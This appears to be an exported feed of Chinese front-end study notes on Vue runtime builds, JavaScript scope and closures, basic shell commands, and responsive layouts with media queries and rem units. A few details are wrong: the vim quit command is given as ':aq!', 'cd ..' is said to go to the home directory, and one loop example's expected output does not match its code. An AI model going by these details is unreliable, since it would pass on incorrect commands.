<li>@vue/cli默认引入的是运行时runtime版本</li>
<li>最佳实践：总是使用runtime非完整版，并配合vue-loader和vue文件</li>
</ul>
<ol>
<li>保证用户体验，用户下载的JS文件体积更小，但只支持h函数</li>
<li>保证开发体验，开发者可以直接在vue文件里写HTML标签，而不写h函数</li>
<li>其他工作交给loader来做，vue-loader会引入compiler（编译器），它会将vue文件里的HTML在构建时预编译成h函数，这样既简化写法又省下空间。<h3 id="template-与-render-的用法"><a href="#template-与-render-的用法" class="headerlink" title="template 与 render 的用法"></a>template 与 render 的用法</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写法更简单，但需要编译器</span></span><br><span class="line"><span class="keyword">new</span> Vue (&#123;</span><br><span class="line">    template: <span class="string">'&lt;div&gt;&#123;&#123; hello &#125;&#125;&lt;/div&gt;'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写成h函数，不需要编译器</span></span><br><span class="line"><span class="keyword">new</span> Vue (&#123;</span><br><span class="line">    render(h) &#123;</span><br><span class="line">        <span class="keyword">return</span> h(<span class="string">'div'</span>, <span class="keyword">this</span>.hello)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="template标签和JS文件中的template"><a href="#template标签和JS文件中的template" class="headerlink" title="template标签和JS文件中的template"></a>template标签和JS文件中的template</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// .vue文件中的template标签</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &#123;&#123;n&#125;&#125;</span><br><span class="line">        &lt;button @click=&quot;add&quot;&gt;+1&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// .js文件中的template</span></span><br><span class="line"><span class="keyword">new</span> Vue (&#123;</span><br><span class="line">    template: <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123;n&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;button @click="add"&gt;+1&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="codeSandbox快速写vue代码"><a href="#codeSandbox快速写vue代码" class="headerlink" title="codeSandbox快速写vue代码"></a>codeSandbox快速写vue代码</h2><ul>
<li>快速开始在线写vue代码，无需安装任何本地依赖 =&gt; <a href="https://codesandbox.io/s/" target="_blank" rel="noopener">https://codesandbox.io/s/</a></li>
<li>不要登录，直接一键create Sandbox选择vue即可</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>作用域及闭包</title>
    <url>/2018/08/05/%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%8F%8A%E9%97%AD%E5%8C%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>执行上下文环境到作用域再到闭包<br><a id="more"></a></p>
<h2 id="执行上下文环境"><a href="#执行上下文环境" class="headerlink" title="执行上下文环境"></a>执行上下文环境</h2><hr>
<p>说到作用域，首先理解一下执行上下文环境（在执行代码之前，把要用到的变量先取出来，有的直接赋值，有的用undefined占位）</p>
<ul>
<li><p>对于普通变量和函数表达式，声明并默认赋值 undefined</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a = 1  //var a 提升，默认值为undefined</span><br><span class="line">var fn = function()&#123;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于函数声明，会赋值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function fn()&#123;&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><hr>
<p>什么是作用域：</p>
<p>作用域是你的代码在运行时，各个变量、函数和对象的可访问性。换句话说，作用域决定了你的代码里的变量和其他资源在各个区域中的可见性。</p>
<p>为什么需要作用域？最小访问原则</p>
<p>那么，限制变量的可见性，不允许你代码中所有的东西在任意地方都可用的好处是什么？其中一个优势，是作用域为你的代码提供了一个安全层级。计算机安全中，有个常规的原则是：用户只能访问他们当前需要的东西。</p>
<p>下面来看一下具体的作用域的问题，可以将作用域抽象的理解为一块地盘，当中没有变量的概念，需要通过作用域对应的执行上下文环境来获取变量的值，所以作用域中变量的值是在执行过程中产生和确定的，而作用域是在函数创建时就确定了。还要记住一点：除了全局作用域，只有函数才能创建作用域</p>
<p><img src="https://i.loli.net/2018/07/03/5b3b8ea1485aa.png" alt="作用域.png"></p>
<ul>
<li>第一步，加载程序时就确定了全局上下文环境，每个函数也都会创建自己的作用域，函数的作用域在创建时就已经确定，而不是在调用的时候</li>
<li>第二步，执行到最后一行调用函数fn(10)，此时生成fn函数的上下文环境，并将它设置成活跃状态</li>
<li>第三步，执行到调用bar(100)，此时生成bar函数的上下文环境，并将它设置成活跃状态</li>
<li>第四步，调用完bar(100)，它的上下文环境被销毁，接着调用bar(200)，生成它的上下文环境，并设置成活跃状态</li>
<li>第五步，bar(200)调用结束，它的上下文环境被销毁，此时又会回到fn(10)的上下文环境，并将它设置成活跃状态</li>
<li>第六步，执行完fn(10)，它的上下文环境销毁，此时又回到全局上下文环境的活跃状态</li>
</ul>
<p>作用域链：当你需要用到一个变量时，在哪个作用域中取得这个变量，这是一个由内而外的查找过程，一层一层直到全局作用域为止，需要注意的是，要到创建这个函数的作用域中取值而不是调用函数的时候</p>
<h3 id="作用域和执行上下文环境的关系"><a href="#作用域和执行上下文环境的关系" class="headerlink" title="作用域和执行上下文环境的关系"></a>作用域和执行上下文环境的关系</h3><p>作用域指的是变量的可见性，上下文指的是在相同作用域中this的值，我们可以使用函数方法改变上下文，在全局作用域中，上下文总是Window对象。一个作用域下可能包含了若干的上下文环境；有可能没有过上下文环境（函数始终没有被调用）；有可能有过，但在函数被调用完之后，上下文环境被销毁；有可能存在一个或多个（即闭包）</p>
<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><hr>
<p>闭包的概念与词法作用域紧密相关，当内部函数试着访问外部函数的作用域链（词法作用域之外的变量）时产生闭包，闭包包括了它们自己的作用域链、父级作用域链和全局作用域链</p>
<p>结合上面对作用域的理解，闭包的一个核心内容是：当函数调用完之后，它的执行上下文环境不会接着被销毁<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var func = function()&#123;</span><br><span class="line">    var a = &apos;jayce&apos;;</span><br><span class="line">    var fn1 = function()&#123;</span><br><span class="line">        a += &apos; xi&apos;;</span><br><span class="line">        console.log(a);</span><br><span class="line">    &#125;</span><br><span class="line">    return fn1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var fn2 = func();</span><br><span class="line">fn2();  // jayce xi</span><br><span class="line">fn2();  // jayce xi xi</span><br></pre></td></tr></table></figure></p>
<p>当你第一次调用完fn2之后，func中的变量a变成’jayce xi’，而没有被销毁，fn1就形成了一个闭包，变量a的生命也因此得以延续。闭包有三个特点：</p>
<ul>
<li>它是一个函数，比如上面例子中的fn1</li>
<li>函数中使用了其他作用域中的变量，使得变量不会被销毁，如上面的fn1调用了它上级作用域func中的变量a</li>
<li>闭包存在在定义该变量的作用域中，上面的变量a存在于func函数的局部作用域中，fn1也存在于此</li>
</ul>
<p>闭包是什么：函数、函数内部可以访问到的变量的总和（也叫环境），就是一个闭包。函数内部返回了一个函数，而函数一个很重要的特点在于可以创建一个独立作用域，当这个要返回的函数体中，需要引用一个变量，这个变量存在于它的上级函数的作用域中，那么这个变量所在的上级函数的上下文环境就不能被销毁，否则就不能获取这个变量了。（访问上级作用域中的变量的权限）</p>
<p>闭包解决了什么：因为闭包可以访问上级作用域，从而打破因作用域引起的函数外部不能访问另一个函数内部变量的束缚，就拿ajax的成功回调来说，这里就是一个闭包的概念，回调函数拥有了访问和操作上级作用域的能力，带来了极大的便利。</p>
<p>闭包的应用场景：ajax请求的成功回调、setTimeout延时回调、一个函数内部返回一个匿名函数、事件上绑定的回调方法，不管是哪种方式，只要是对函数类型的值进行传递，当函数在别处被调用时都是闭包的一个具体表现</p>
<p>作用：</p>
<ul>
<li>隐藏变量，但通过返回一个函数使得外部可以访问这个变量</li>
<li>封装对象的私有属性和方法</li>
</ul>
]]></content>
      <tags>
        <tag>作用域 闭包</tag>
      </tags>
  </entry>
  <entry>
    <title>你不知道的JS——闭包再理解</title>
    <url>/2018/08/05/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E2%80%94%E2%80%94%E9%97%AD%E5%8C%85%E5%86%8D%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>你不知道的Javascript上卷中再次回顾闭包的概念<br><a id="more"></a><br>当函数可以记住并访问所在的词法作用域时，就产生了闭包，即使函数当前是在词法作用域之外执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function foo()&#123;</span><br><span class="line">    var a = 2;</span><br><span class="line">    function bar()&#123;</span><br><span class="line">        console.log(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var baz = foo();</span><br><span class="line">baz();  // 2  这就是闭包的效果</span><br></pre></td></tr></table></figure>
<p>函数bar的词法作用域能够访问foo的内部作用域，然后将bar函数本身当作一个值类型传递，在上面代码中，我们将bar所引用的函数对象本身当作返回值。</p>
<p>在foo()执行后，其返回值（也就是内部的bar函数）赋值给变量baz并调用baz()，实质上只是通过不同的标识符引用调用了内部的函数bar()</p>
<p>在foo()执行后通常会认为它的整个内部作用域会被销毁，因为JS引擎有垃圾回收释放内存的机制。然而，闭包的神奇之处就在于可以阻止作用域被销毁，因为bar函数仍在使用这个内部作用域，这个引用就叫闭包。</p>
<p>总结：</p>
<ul>
<li>函数在定义时的词法作用域之外的地方被调用，而闭包使得函数可以继续访问定义时的词法作用域</li>
<li>只要是对函数类型的值进行传递，在函数被调用的时候，都可以看到闭包的身影</li>
</ul>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><h3 id="setTimeout延时函数"><a href="#setTimeout延时函数" class="headerlink" title="setTimeout延时函数"></a>setTimeout延时函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function wait(message)&#123;</span><br><span class="line">    setTimeout(function timer()&#123;</span><br><span class="line">        console.log(message);</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait(&quot;Hello, closure!&quot;);</span><br></pre></td></tr></table></figure>
<p>将一个内部函数timer传递给setTimeout()，timer函数具有涵盖wait函数作用域的闭包，所以在函数外部，仍可以保有对message变量的引用</p>
<h3 id="for循环和闭包"><a href="#for循环和闭包" class="headerlink" title="for循环和闭包"></a>for循环和闭包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(var i=0;i&lt;=5;i++)&#123;</span><br><span class="line">    setTimeout(function timer()&#123;</span><br><span class="line">        console.log(i);</span><br><span class="line">    &#125;, i*1000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对这段代码的预期是分别输出数字1～5，每秒一次，每次一个。当执行后发现，实际输出的效果是每秒一次的频率输出了5个6</p>
<p>因为 setTimeout 是个异步函数，所以会先把循环全部执行完毕，这时候 i 就是 6 了，所以会输出一堆 6。（这段代码的循环终止条件是i不再&lt;=5，这时i首次成立的条件是i=6，而for循环中声明的i变量是全局变量，当打印事件发生的时候，i已经完成了赋值操作，即i=6，所以控制台打印的结果总是6）</p>
<p>这里没有达到我们预期效果的原因在于，我们试图假设循环中每次迭代在运行时都会给自己捕获一个i的副本，但根据作用域的工作原理，虽然循环中的五个函数是在各个迭代中分别定义的，但它们都被封闭在一个共享的全局作用域中，因此实际上只有一个i</p>
<p>在循环的过程中每个迭代都需要一个闭包作用域，下面有两种解决办法：</p>
<ul>
<li>创建一个变量用来在每次迭代中储存i的值（闭包的方式）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(var i=0;i&lt;=5;i++)&#123;</span><br><span class="line">    (function()&#123;</span><br><span class="line">        var j = i;</span><br><span class="line">        setTimeout(function timer()&#123;</span><br><span class="line">            console.log(j);</span><br><span class="line">        &#125;, j*1000);</span><br><span class="line">    &#125;)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>用立即执行函数，创造一个函数作用域。在每次i值改变的时候，都把i的值保存给内部函数作用域的变量j，因为立即执行函数跟i赋值的时候可以说是同步执行的，然后控制台的时候，就会拿到函数作用域中的i。</p>
<ul>
<li>let声明可以劫持块作用域，并在这个块作用域中声明一个变量<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(let i=0;i&lt;=5;i++)&#123;</span><br><span class="line">    setTimeout(function timer()&#123;</span><br><span class="line">        console.log(i);</span><br><span class="line">    &#125;, i*1000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>将let声明在for循环头部同样可以解决问题，它还有一个特殊的行为，这个行为指出变量在循环过程中不止被声明一次，每次迭代都会声明，随后的每个迭代都会使用上一个迭代结束时的值来初始化这个变量。</p>
<ul>
<li>使用 setTimeout 的第三个参数，这个参数会被当成 timer 函数的参数传入<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(var i=0;i&lt;=5;i++)&#123;</span><br><span class="line">    setTimeout(function timer(j)&#123;</span><br><span class="line">        console.log(j);</span><br><span class="line">    &#125;, i*1000, i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <tags>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title>命令行基础操作</title>
    <url>/2018/08/28/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>记下平时常用的命令<br><a id="more"></a><br>在学习命令行的过程中，遇到不懂的命令及用法，可在网站： explainshell.com 来查看学习</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>1、绝对路径和相对路径：以 / 开头的就是绝对路径，其他就是相对路径</p>
<p>2、基本符号的含义<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~  用户目录（mac中的家目录）  eg：/Users /mxy</span><br><span class="line">/  根目录，整个系统</span><br><span class="line">.  所在当前目录</span><br><span class="line">..  父级目录，即当前目录的上级目录</span><br><span class="line">$  提示符，表示可以输入命令</span><br></pre></td></tr></table></figure></p>
<h2 id="简单操作"><a href="#简单操作" class="headerlink" title="简单操作"></a>简单操作</h2><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><ul>
<li><p>不包括隐藏文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看所有文件（包括隐藏）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -a</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看当前目录下所有路径详细信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -l</span><br></pre></td></tr></table></figure>
</li>
<li><p>前两种的结合，即查看当前目录下所有文件的详细信息（包括隐藏文件）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -al</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="切换目录：cd"><a href="#切换目录：cd" class="headerlink" title="切换目录：cd"></a>切换目录：cd</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd 文件名</span><br></pre></td></tr></table></figure>
<p>返回上一级文件夹（即返回 ~ 家目录）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd ..</span><br></pre></td></tr></table></figure></p>
<p>切换至当前目录下的文件夹<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd ./文件名  等同于   $ cd 文件名</span><br></pre></td></tr></table></figure></p>
<h3 id="文件相关"><a href="#文件相关" class="headerlink" title="文件相关"></a>文件相关</h3><ul>
<li><p>创建文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ touch 1.txt  // 如果没有则新建，如果有则改变文件最后更新时间</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ rm 文件路径  // 删除文件</span><br><span class="line">$ rm -f 文件路径  // 强制删除文件（-f：强制）</span><br><span class="line">$ rm -r 目录路径  // 删除目录（-r：递归）</span><br><span class="line">$ rm -rf 目录路径  // 强制删除目录，目录只能递归地删除，没有-r目录删除不掉，没有-f则会一遍遍询问是否删除</span><br></pre></td></tr></table></figure>
</li>
<li><p>移动文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mv 1.txt 111.txt  // 重命名</span><br><span class="line">$ mv 1.txt demo  // 将文件1.txt移动到demo文件夹</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建文件夹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir text</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li>pwd  // 快速查看当前路径</li>
<li>tree 目录名  // 查看目录结构</li>
<li>tldr 命令  // 快速查询一个命令怎么使用</li>
<li>clear  // 清屏</li>
<li>history  // 查看历史操作</li>
</ul>
<h2 id="vim的使用"><a href="#vim的使用" class="headerlink" title="vim的使用"></a>vim的使用</h2><p>1、创建index.html<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ touch index.html</span><br></pre></td></tr></table></figure></p>
<p>2、编辑index.html<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vi index.html</span><br></pre></td></tr></table></figure></p>
<p>3、按下键盘上的 i 键进入编辑模式</p>
<p>4、按下 esc 退出编辑模式</p>
<p>5、保存与不保存<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:wq!  保存并退出</span><br><span class="line">:aq!  不保存并退出</span><br></pre></td></tr></table></figure></p>
<p>6、查看文件结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat 文件名  // 显示文件内容</span><br><span class="line">$ cat 文件1 文件2 &gt; 文件3  //  将文件1和文件2合并放进文件3，文件3原本内容被替代，如果不存在文件3则新建一个</span><br></pre></td></tr></table></figure></p>
<p>花式练vim：<br><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTk1ODE0MA==&amp;mid=2648436205&amp;idx=1&amp;sn=31783b90ad372c27457e6c394659d9b2&amp;chksm=be82d8fe89f551e8b035c03919230a470b5bc6324e219f46a2b4478f368d2fdee491518b1987&amp;mpshare=1&amp;scene=1&amp;srcid=0605oexPQ6Bh0PamzpiSjQ6a&amp;key=10a5f2b3370ca265748cfcc6b93af05ec9bb9c614f130b6d3b4665b31af06dcd1225ced8fc7d27e11c4c00ff365f2829ea5547ff3468d07ac58745d792bae9a42b98063c8da7c478062b5a7e463c0a50&amp;ascene=0&amp;uin=OTAyMTc5NDQw&amp;devicetype=iMac+MacBookAir5%2C1+OSX+OSX+10.13.5+build(17F59b)&amp;version=12020010&amp;nettype=WIFI&amp;lang=zh_CN&amp;fontScale=100&amp;pass_ticket=QcUzX%2FQH9oKZGdPAAFIYmpJrFUAPwy8JLfcrE9YCcLSVoFyC6bRxWS8Dbhpbatp%2F" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5MTk1ODE0MA==&amp;mid=2648436205&amp;idx=1&amp;sn=31783b90ad372c27457e6c394659d9b2&amp;chksm=be82d8fe89f551e8b035c03919230a470b5bc6324e219f46a2b4478f368d2fdee491518b1987&amp;mpshare=1&amp;scene=1&amp;srcid=0605oexPQ6Bh0PamzpiSjQ6a&amp;key=10a5f2b3370ca265748cfcc6b93af05ec9bb9c614f130b6d3b4665b31af06dcd1225ced8fc7d27e11c4c00ff365f2829ea5547ff3468d07ac58745d792bae9a42b98063c8da7c478062b5a7e463c0a50&amp;ascene=0&amp;uin=OTAyMTc5NDQw&amp;devicetype=iMac+MacBookAir5%2C1+OSX+OSX+10.13.5+build(17F59b)&amp;version=12020010&amp;nettype=WIFI&amp;lang=zh_CN&amp;fontScale=100&amp;pass_ticket=QcUzX%2FQH9oKZGdPAAFIYmpJrFUAPwy8JLfcrE9YCcLSVoFyC6bRxWS8Dbhpbatp%2F</a></p>
<h2 id="查看全局安装过的包"><a href="#查看全局安装过的包" class="headerlink" title="查看全局安装过的包"></a>查看全局安装过的包</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm list -g --depth 0</span><br></pre></td></tr></table></figure>
<p>-g 全局安装的<br>list 罗列已安装的node包<br><img src="https://i.loli.net/2018/08/28/5b8551474a6bd.png" alt="alt text"></p>
]]></content>
      <tags>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>响应式布局及动态rem</title>
    <url>/2018/08/03/%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80%E5%8F%8A%E5%8A%A8%E6%80%81rem/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>移动端适配及动态rem方案<br><a id="more"></a></p>
<h2 id="使用meta标签"><a href="#使用meta标签" class="headerlink" title="使用meta标签"></a>使用meta标签</h2><hr>
<p>在做移动端页面时，要使用meta标签，它用来控制页面在移动端不要缩放，如果没有指定，将会默认为980px，它指定了以下内容：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, user-scalable=no, maximum-scale=1, minimum-scale=1&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>芳芳老师曾经给过一个答案，它的作用是这样来的：一开始的页面都是为PC端准备的，在乔布斯推出了iPhone3GS手机后，PC端的页面不能适应手机屏幕的大小，所以苹果工程师想出了一个办法，默认将手机模拟成980px，使得页面缩小可以适应手机屏幕，后来智能手机普及，这个功能部分网站不再需要，所以就用meta:vp来控制手机页面不要缩放。</p>
<h2 id="media媒体查询功能"><a href="#media媒体查询功能" class="headerlink" title="@media媒体查询功能"></a>@media媒体查询功能</h2><hr>
<p>有两种方式加入媒体查询</p>
<ul>
<li><p>在style标签中直接插入 @media 后接查询条件，如果满足条件，里面的CSS代码就生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">  @media(min-width: 320px) and (max-width: 375px)&#123;  //在设备最小宽度为320px，最大宽度375px时body的背景颜色才会被改变</span><br><span class="line">    body&#123;</span><br><span class="line">        background: pink;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在link标签中引用media</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; media=&quot;(max-width: 320px)&quot;&gt;  //在最大宽度为320px时，才会执行style.css文件</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这里有一点要注意，虽然css代码是有条件的执行，但是css文件总是会被下载，只是看是否生效</p>
<h3 id="用很多套css样式来匹配不同的设备宽度"><a href="#用很多套css样式来匹配不同的设备宽度" class="headerlink" title="用很多套css样式来匹配不同的设备宽度"></a>用很多套css样式来匹配不同的设备宽度</h3><hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">  @media (min-width: 769px)&#123;  /*769~正无穷*/</span><br><span class="line">    body&#123;</span><br><span class="line">        background: purple;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (max-width: 768px)&#123;  /* 0~768 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: yellow;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (max-width: 425px)&#123;  /* 0~425 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: orange;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (max-width: 375px)&#123;  /* 0~375 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: pink;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (max-width: 320px)&#123;  /* 0~320 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: green;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
<p>这里要注意一个优先级的问题，如果将最大宽度的顺序从小往大写，可能存在前面的样式被覆盖的问题，解决方法可以是上面那样将顺序颠倒，使得最大宽度的顺序从大往小；或者将查询条件写到很具体，使得条件之间没有交集<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">  @media (max-width: 320px)&#123;  /* 0~320 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: yellow;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (min-width: 321px) and (max-width: 375px)&#123;  /* 321~375 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: orange;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (min-width: 376px) and (max-width: 425px)&#123;  /* 376~425 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: pink;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (min-width: 426px) and (max-width: 768px)&#123;  /* 426~728 */</span><br><span class="line">      body&#123;</span><br><span class="line">          background: green;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @media (min-width: 769px)&#123;  /*769~正无穷*/</span><br><span class="line">    body&#123;</span><br><span class="line">        background: purple;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="动态rem"><a href="#动态rem" class="headerlink" title="动态rem"></a>动态rem</h2><hr>
<ul>
<li>页面中，默认的字体大小(font-size)是16px，Chrome默认最小字体是12px</li>
<li>rem指的是根元素的 font-size 大小（例如 <html> 元素的font-size）</html></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">html:</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">    你好，我是xxx</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">css:</span><br><span class="line">p&#123;</span><br><span class="line">    font-size: 2rem;  /* 这里的2rem是指字体大小为32px，因为页面默认font-size为16px，1rem = 16px */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">css:</span><br><span class="line">body&#123;</span><br><span class="line">    font-size: 20px;</span><br><span class="line">&#125;</span><br><span class="line">p&#123;</span><br><span class="line">    font-size: 2rem;  /* 这里的2rem仍然是32px，虽然设置了body的字体大小，但是rem指的是根元素html的字体大小，所以这里仍然是1rem = 16px的默认值 */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果像下面这样设置了html的字体大小，那么 1rem 就是设置的字体大小<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">css:</span><br><span class="line">html&#123;</span><br><span class="line">    font-size: 20px;</span><br><span class="line">&#125;</span><br><span class="line">p&#123;</span><br><span class="line">    font-size: 2rem;  /* 这时p标签里的内容就是40px，因为设置了根元素的字体大小为20px，那么 1rem = 20px，而不是默认值16px了 */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="适配手机的页面布局（百分比布局）"><a href="#适配手机的页面布局（百分比布局）" class="headerlink" title="适配手机的页面布局（百分比布局）"></a>适配手机的页面布局（百分比布局）</h3><hr>
<p><img src="https://i.loli.net/2018/07/03/5b3b8ecd37145.jpg" alt="百分比布局.jpg"></p>
<p>这样的设计方法可以适配不同宽度的手机，但缺点是宽度和高度不能调试，因为宽度不是一个固定的值，所以高度也没办法确定</p>
<h3 id="引入动态rem方案"><a href="#引入动态rem方案" class="headerlink" title="引入动态rem方案"></a>引入动态rem方案</h3><hr>
<ul>
<li>它的主要思路是所有元素按比例放大或缩小（一切以宽度为基准），同时还解决了高度和宽度没有关联的问题</li>
<li>用JS来设置html的font-size等于页面宽度，而rem是依赖html的font-size的，进而使得rem间接依赖于页面宽度，可以这么理解 1 rem == html font-size == viewport width</li>
<li>rem也可以与其他单位同时存在<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">font-size: 16px;</span><br><span class="line">border: 1px solid red;</span><br><span class="line">width: 0.5rem;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>下面以实现这样一个设计稿为例：</p>
<p><img src="https://i.loli.net/2018/07/03/5b3b8ecdbd500.png" alt="设计稿.png"></p>
